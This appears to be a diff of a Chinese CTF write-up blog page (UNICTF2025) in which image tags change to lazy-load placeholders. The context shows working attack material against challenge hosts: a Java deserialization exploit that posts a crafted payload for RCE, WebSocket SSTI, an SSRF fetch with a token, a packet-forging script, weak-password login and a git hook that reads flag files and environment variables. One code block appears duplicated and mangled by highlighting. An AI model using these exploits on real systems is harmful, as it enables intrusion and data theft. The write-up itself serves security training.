 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- internal-services: [public_web, admin_panel, w*_*e*1*r] --&gt;</span><br></pre></td></tr></table></figure>
 
@@ -429,22 +326,22 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">80, 443, 3000, 5000, 6379, 8000, 8001, 8080, 8081, 8888, 9000, 9200, 1337，22，7001，8899</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>扫到了8001，是admin_panel，直接看没有信息，看openapi.json</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260419145259979.png" alt="image-20260419145259979"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260419145259979.png" alt="image-20260419145259979"></p>
 <p>有一个接口&#x2F;redirect_ws</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260419145505003.png" alt="image-20260419145505003"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260419145505003.png" alt="image-20260419145505003"></p>
 <p>在9000端口有WebSocket 服务！直接访问<code>ws://127.0.0.1:9000/ws?token=92b590216cbb44a79ab60c80e026b7b0</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;ws&quot;: &quot;ok&quot;,</span><br><span class="line">  &quot;message&quot;: &quot;handshake success&quot;,</span><br><span class="line">  &quot;welcome&quot;: &quot;&#123;\&quot;error\&quot;:\&quot;invalid origin &#x27;None&#x27; ; X-Internal-Token header must match ?token; token expired or invalid (try /redirect_ws)\&quot;&#125;&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>添加请求头X-Internal-Token: token</p>
 <p>然后是</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260419150509191.png" alt="image-20260419150509191"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260419150509191.png" alt="image-20260419150509191"></p>
 <p>在添加origin:<a target="_blank" rel="noopener" href="http://127.0.0.1,这个token是一次性的,发送一次请求就需要再次获取一个新的token/">http://127.0.0.1,这个token是一次性的，发送一次请求就需要再次获取一个新的token</a></p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260419150834373.png" alt="image-20260419150834373"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260419150834373.png" alt="image-20260419150834373"></p>
 <p>然后就是就是ssti，发送json即可</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260419151204480.png" alt="image-20260419151204480"></p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260419151412538.png" alt="image-20260419151412538"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260419151204480.png" alt="image-20260419151204480"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260419151412538.png" alt="image-20260419151412538"></p>
 <h2 id="ez-Java"><a href="#ez-Java" class="headerlink" title="ez Java"></a>ez Java</h2><p>这是一道java反序列化题目，</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260419153628190.png" alt="image-20260419153628190"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260419153628190.png" alt="image-20260419153628190"></p>
 <p>这里给出了上传路径，先分析一下jar包</p>
 <p>首先是<strong>UserProfileController.class</strong></p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&#123;&quot;/api/user&quot;&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserProfileController</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LoggerFactory.getLogger(UserProfileController.class);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&#123;&quot;/settings/import&quot;&#125;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">importSettings</span><span class="params">(<span class="meta">@RequestParam(name = &quot;configData&quot;)</span> String configData)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] rawData = Tools.base64Decode(configData);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(rawData));</span><br><span class="line">            <span class="type">String</span> <span class="variable">identity</span> <span class="operator">=</span> ois.readUTF();</span><br><span class="line">            <span class="type">int</span> <span class="variable">version</span> <span class="operator">=</span> ois.readInt();</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;InternalManager&quot;</span>.equals(identity) &amp;&amp; version == <span class="number">2025</span>) &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">                logger.info(<span class="string">&quot;Config Sync Status: Object [&#123;&#125;] has been integrated into system context.&quot;</span>, obj);</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;SUCCESS: Configuration synchronized at internal level.&quot;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;FAILED: Identity verification failed.&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var7) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;ERROR: Malformed configuration stream.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="string">&quot;&#125;)</span></span><br><span class="line"><span class="string">public class UserProfileController &#123;</span></span><br><span class="line"><span class="string">    private static final Logger logger = LoggerFactory.getLogger(UserProfileController.class);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    @PostMapping(&#123;&quot;</span>/settings/<span class="keyword">import</span><span class="string">&quot;&#125;)</span></span><br><span class="line"><span class="string">    public String importSettings(@RequestParam(name = &quot;</span>configData<span class="string">&quot;) String configData) &#123;</span></span><br><span class="line"><span class="string">        try &#123;</span></span><br><span class="line"><span class="string">            byte[] rawData = Tools.base64Decode(configData);</span></span><br><span class="line"><span class="string">            ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(rawData));</span></span><br><span class="line"><span class="string">            String identity = ois.readUTF();</span></span><br><span class="line"><span class="string">            int version = ois.readInt();</span></span><br><span class="line"><span class="string">            if (&quot;</span>InternalManager<span class="string">&quot;.equals(identity) &amp;&amp; version == 2025) &#123;</span></span><br><span class="line"><span class="string">                Object obj = ois.readObject();</span></span><br><span class="line"><span class="string">                logger.info(&quot;</span>Config Sync Status: Object [&#123;&#125;] has been integrated into system context.<span class="string">&quot;, obj);</span></span><br><span class="line"><span class="string">                return &quot;</span>SUCCESS: Configuration <span class="keyword">synchronized</span> at internal level.<span class="string">&quot;;</span></span><br><span class="line"><span class="string">            &#125; else &#123;</span></span><br><span class="line"><span class="string">                return &quot;</span>FAILED: Identity verification failed.<span class="string">&quot;;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125; catch (Exception var7) &#123;</span></span><br><span class="line"><span class="string">            return &quot;</span>ERROR: Malformed configuration stream.<span class="string">&quot;;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
@@ -482,14 +379,14 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unictf.ctf.tools.ConfigDataWrapper;</span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.HttpURLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLEncoder;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">class</span> <span class="title class_">Exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 目标地址</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">target</span> <span class="operator">=</span> <span class="string">&quot;http://8888-b87758a6-93ac-41d9-a29f-00b08d7406d3.challenge.ctfplus.cn/api/user/settings/import&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 读取字节码 + 异或解密</span></span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;test.class&quot;</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; bytes.length; i++) &#123;</span><br><span class="line">            bytes[i] = (<span class="type">byte</span>) (bytes[i] ^ <span class="number">0xff</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ========== 核心：反射设置 Jar 包中的类字段 ==========</span></span><br><span class="line">        <span class="type">ConfigDataWrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConfigDataWrapper</span>();</span><br><span class="line"></span><br><span class="line">        setField(wrapper, <span class="string">&quot;configId&quot;</span>, <span class="string">&quot;CONF-2025&quot;</span>);</span><br><span class="line">        setField(wrapper, <span class="string">&quot;sign&quot;</span>, <span class="string">&quot;ready&quot;</span>);</span><br><span class="line">        setField(wrapper, <span class="string">&quot;ClassByte&quot;</span>, bytes); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// ========== 构造恶意序列化数据 ==========</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bad</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">valField</span> <span class="operator">=</span> BadAttributeValueExpException.class.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        valField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        valField.set(bad, wrapper);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ========== 打包 payload ==========</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeUTF(<span class="string">&quot;InternalManager&quot;</span>);</span><br><span class="line">        oos.writeInt(<span class="number">2025</span>);</span><br><span class="line">        oos.writeObject(bad);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Base64 + URL 编码发送</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="type">String</span> <span class="variable">body</span> <span class="operator">=</span> <span class="string">&quot;configData=&quot;</span> + URLEncoder.encode(payload, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 发送请求</span></span><br><span class="line">        <span class="type">HttpURLConnection</span> <span class="variable">conn</span> <span class="operator">=</span> (HttpURLConnection) <span class="keyword">new</span> <span class="title class_">URL</span>(target).openConnection();</span><br><span class="line">        conn.setRequestMethod(<span class="string">&quot;POST&quot;</span>);</span><br><span class="line">        conn.setDoOutput(<span class="literal">true</span>);</span><br><span class="line">        conn.setRequestProperty(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">        conn.getOutputStream().write(body.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;请求发送成功！响应码：&quot;</span> + conn.getResponseCode());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 工具方法：通用反射赋值</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setField</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>然后就可以rce了，flag在环境变量中</p>
-<p> <img src="/2026/04/23/UNICTF2025/image-20260419230208353.png" alt="image-20260419230208353"></p>
+<p> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260419230208353.png" alt="image-20260419230208353"></p>
 <p>这里要注意版本使用jdk8版本，然后就是导入jar包的问题，由于刚开始接触java反序列化关于idea中的一些配置不太熟悉，刚开始直接导入Unictf.jar包一直报错，后来发现是导入包的路径不对，上述代码需要导入的是</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260419230859493.png" alt="image-20260419230859493"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260419230859493.png" alt="image-20260419230859493"></p>
 <p>然后同步修改pox.xml就可以</p>
 <h2 id="Bytecode-Compiler"><a href="#Bytecode-Compiler" class="headerlink" title="Bytecode Compiler"></a>Bytecode Compiler</h2><p>首先看一下题目是字节码编译器，会执行三个指令，抓包看一下</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260420202031234.png" alt="image-20260420202031234"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260420202031234.png" alt="image-20260420202031234"></p>
 <p>发送的并不是明文，而是一段base64编码，如果勾选了诊断模式，</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260420202304255.png" alt="image-20260420202304255">这里会有flag在前端就泄露了处理逻辑&#x2F;bundle.js，这里分析主要逻辑。</p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260420202304255.png" alt="image-20260420202304255">这里会有flag在前端就泄露了处理逻辑&#x2F;bundle.js，这里分析主要逻辑。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">const nonce = new Uint8Array(8); // 8字节随机数</span><br><span class="line">crypto.getRandomValues(nonce);  // 密码学安全随机数</span><br><span class="line">const nonceLow32 = new DataView(nonce.buffer).getUint32(0, true);</span><br><span class="line">const flags = diagModeEl.checked ? 0x01 : 0x00; // 诊断模式标志</span><br></pre></td></tr></table></figure>
 
 <p>这里的flags是一个常量，根据flags&#x3D;1就是诊断模式，用来展示详细的数据。这里的flag是标志，看看代码中是怎么定义的</p>
@@ -504,18 +401,18 @@
 <p>在代码中定义的是flag的值是1或者0，经过左右移动，最高位是0就是整数，最高位是1就是负数，flag在0x00 ~ 0x7F就是正数，0x80 ~ 0xFF就是负数，但是题目默认定义的是0x00,0x01,也就是说永远负数。就不会用到那个隐藏的命令，现在以及知道了加密算法就可以构造任意命令进入，参考官方给出的脚本</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">KEY_PARTS = [<span class="number">0x1C</span>, <span class="number">0x2D</span>, <span class="number">0x3E</span>, <span class="number">0x40</span>, <span class="number">0xA5</span>, <span class="number">0xB6</span>, <span class="number">0xC7</span>, <span class="number">0xD8</span>, <span class="number">0x24</span>, <span class="number">0x68</span>, <span class="number">0xAC</span>, <span class="number">0xE0</span>]</span><br><span class="line">K1 = ((KEY_PARTS[<span class="number">0</span>] &lt;&lt; <span class="number">24</span>) | (KEY_PARTS[<span class="number">1</span>] &lt;&lt; <span class="number">16</span>) | (KEY_PARTS[<span class="number">2</span>] &lt;&lt; <span class="number">8</span>) | KEY_PARTS[<span class="number">3</span>]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">K2 = ((KEY_PARTS[<span class="number">4</span>] &lt;&lt; <span class="number">24</span>) | (KEY_PARTS[<span class="number">5</span>] &lt;&lt; <span class="number">16</span>) | (KEY_PARTS[<span class="number">6</span>] &lt;&lt; <span class="number">8</span>) | KEY_PARTS[<span class="number">7</span>]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">K3 = ((KEY_PARTS[<span class="number">8</span>] &lt;&lt; <span class="number">24</span>) | (KEY_PARTS[<span class="number">9</span>] &lt;&lt; <span class="number">16</span>) | (KEY_PARTS[<span class="number">10</span>] &lt;&lt; <span class="number">8</span>) | KEY_PARTS[<span class="number">11</span>]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">ROT = <span class="number">11</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rotl32</span>(<span class="params">value, shift</span>):</span><br><span class="line">    <span class="keyword">return</span> ((value &lt;&lt; shift) | (value &gt;&gt; (<span class="number">32</span> - shift))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_op</span>(<span class="params">op_id, nonce_low32</span>):</span><br><span class="line">    rot = rotl32(nonce_low32 ^ K2, ROT) &amp; <span class="number">0xFFFFFFFC</span></span><br><span class="line">    base = (op_id ^ K1) + rot</span><br><span class="line">    <span class="keyword">return</span> ((base ^ K3) | <span class="number">0x80000000</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fnv1a32</span>(<span class="params">data</span>):</span><br><span class="line">    h = <span class="number">0x811C9DC5</span></span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> data:</span><br><span class="line">        h = (h ^ b) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        <span class="keyword">if</span> h &amp; <span class="number">0x80000000</span>:</span><br><span class="line">            h = h - <span class="number">0x100000000</span></span><br><span class="line">        h = <span class="built_in">int</span>(<span class="built_in">float</span>(h) * <span class="built_in">float</span>(<span class="number">0x01000193</span>)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> h</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_packet</span>(<span class="params">op_id, flags, arg_bytes, nonce</span>):</span><br><span class="line">    nonce_low32 = struct.unpack(<span class="string">&quot;&lt;I&quot;</span>, nonce[:<span class="number">4</span>])[<span class="number">0</span>]</span><br><span class="line">    op_code = encode_op(op_id, nonce_low32)</span><br><span class="line">    </span><br><span class="line">    body = <span class="built_in">bytearray</span>()</span><br><span class="line">    body.extend(<span class="string">b&quot;WVLT&quot;</span>)</span><br><span class="line">    body.append(<span class="number">0x01</span>)</span><br><span class="line">    body.extend(nonce)</span><br><span class="line">    body.append(<span class="number">1</span>)</span><br><span class="line">    body.extend(struct.pack(<span class="string">&quot;&lt;I&quot;</span>, op_code))</span><br><span class="line">    body.append(flags &amp; <span class="number">0xFF</span>)</span><br><span class="line">    body.extend(struct.pack(<span class="string">&quot;&lt;H&quot;</span>, <span class="built_in">len</span>(arg_bytes)))</span><br><span class="line">    body.extend(arg_bytes)</span><br><span class="line">    </span><br><span class="line">    checksum = fnv1a32(body)</span><br><span class="line">    body.extend(struct.pack(<span class="string">&quot;&lt;I&quot;</span>, checksum))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(body)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    op_id = <span class="number">0</span></span><br><span class="line">    flags = <span class="number">0x00</span></span><br><span class="line">    arg = <span class="string">&quot;hello&quot;</span></span><br><span class="line">    nonce = os.urandom(<span class="number">8</span>)</span><br><span class="line">    packet = build_packet(op_id, flags, arg.encode(<span class="string">&quot;utf-8&quot;</span>), nonce)</span><br><span class="line">    <span class="built_in">print</span>(base64.b64encode(packet).decode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2026/04/23/UNICTF2025/image-20260421195300753.png" alt="image-20260421195300753"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260421195300753.png" alt="image-20260421195300753"></p>
 <p>这里给出了token，题目提示系统支持后端拉取配置：<code>/api/fetch?url=...&amp;token=...</code>（token 正确时会携带管理头）</p>
 <p>有了token，就可以ssrf，在robots.txt有路径</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260421195712554.png" alt="image-20260421195712554"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260421195712554.png" alt="image-20260421195712554"></p>
 <p><code>/api/fetch?url=http://127.0.0.1/internal/flag&amp;token=you-got-me-baby-where-is-my-bytecode</code></p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260421201418130.png" alt="image-20260421201418130"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260421201418130.png" alt="image-20260421201418130"></p>
 <h2 id="gogogos"><a href="#gogogos" class="headerlink" title="gogogos"></a>gogogos</h2><p>打开容器看到已经存在一个用户</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260421201520801.png" alt="image-20260421201520801"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260421201520801.png" alt="image-20260421201520801"></p>
 <p>然后就是弱口令ctf:ctf登入进去，发现是admin用户</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260421202011339.png" alt="image-20260421202011339"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260421202011339.png" alt="image-20260421202011339"></p>
 <p>创建仓库可以查看钩子</p>
-<p><img src="/2026/04/23/UNICTF2025/image-20260422155409414.png" alt="image-20260422155409414"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2026/04/23/UNICTF2025/image-20260422155409414.png" alt="image-20260422155409414"></p>
 <p>这里可以重写pre-receive,服务器收到客户端的 push 请求后，在任何提交被写入仓库之前执行。修改如下</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">(cat /flag 2&gt;/dev/null || cat /flag.txt 2&gt;/dev/null || cat /app/flag 2&gt;/dev/null || cat /app/flag.txt 2&gt;/dev/null || printenv FLAG 2&gt;/dev/null || printenv GZCTF_FLAG 2&gt;/dev/null || printenv DASFLAG 2&gt;/dev/null) &gt;&amp;2</span><br><span class="line">exit 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
@@ -523,12 +420,12 @@
